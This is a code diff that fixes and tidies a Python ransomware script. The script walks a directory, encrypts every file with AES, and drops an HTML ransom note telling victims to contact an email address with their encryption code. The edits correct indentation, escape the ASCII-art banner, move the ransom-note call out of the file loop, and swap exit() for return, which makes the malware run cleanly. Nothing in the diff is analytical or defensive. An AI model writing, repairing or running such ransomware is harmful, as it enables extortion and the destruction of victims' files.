@@ -1,4 +1,4 @@
-import  os
+import os
 import hashlib
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -6,7 +6,6 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import platform
 from helpers import derive_key, TOKEN
-
 
 
 def encrypt_data(data: bytes, token: str = TOKEN) -> bytes:
@@ -58,7 +57,7 @@ def encrypt_directory(directory: str, password: str):
         for file in files:
             file_path = os.path.join(root, file)
             encrypt_file(file_path, password)
-        create_ransom_note_webpage(directory)
+    create_ransom_note_webpage(directory)  # Moved outside the loop
 
 def create_ransom_note_webpage(directory: str, token: str = TOKEN):
     """Create a ransom note webpage in the given directory."""
@@ -66,7 +65,7 @@ def create_ransom_note_webpage(directory: str, token: str = TOKEN):
     <html>
     <head><title>Ransom Note</title></head>
     <body>
-        <h1> All of your files have been encrypted!</h1>
+        <h1>All of your files have been encrypted!</h1>
         <p>To unlock them, contact me with your encryption code at sheilafana21@gmail.com.</p>
         <p>Your encryption code is: {TOKEN}</p>
     </body>
@@ -79,28 +78,28 @@ def create_ransom_note_webpage(directory: str, token: str = TOKEN):
 def main():
     ascii_art = """
       _____                                                                              
-     |  __ \                                                                             
+     |  __ \\                                                                             
      | |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
-     |  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
-     | | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
-     |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
+     |  _  /   / _` | | '_ \\  / __|  / _ \\  | '_ ` _ \\  \\ \\ /\\ / /  / _` | | '__|  / _ \\ 
+     | | \\ \\  | (_| | | | | | \\__ \\ | (_) | | | | | | |  \\ V  V /  | (_| | | |    |  __/ 
+     |_|  \\_\\  \\__,_| |_| |_| |___/  \\___/  |_| |_| |_|   \\_/\\_/    \\__,_| |_|     \\___| 
+    
     """
     print(ascii_art)
- # Automatically detect OS and set target directory
-target = os.path.join(os.path.expanduser("~"), "Desktop", "test")
+    
+    # Automatically detect OS and set target directory
+    target = os.path.join(os.path.expanduser("~"), "Desktop", "test")
 
-if not os.path.exists(target):
-    print("Folder does not exist.")
-    exit()
+    if not os.path.exists(target):
+        print("Folder does not exist.")
+        return  # Changed from exit() to return
 
     # Encrypt the target directory
-
     if os.path.isdir(target):
         encrypt_directory(target, TOKEN)
-        create_ransom_note_webpage(target)
         print(f"Encryption complete. Ransom note created in: {target}")
     else:
         print(f"Target directory does not exist: {target}")
 
 if __name__ == "__main__":
-    main()                                           
+    main()
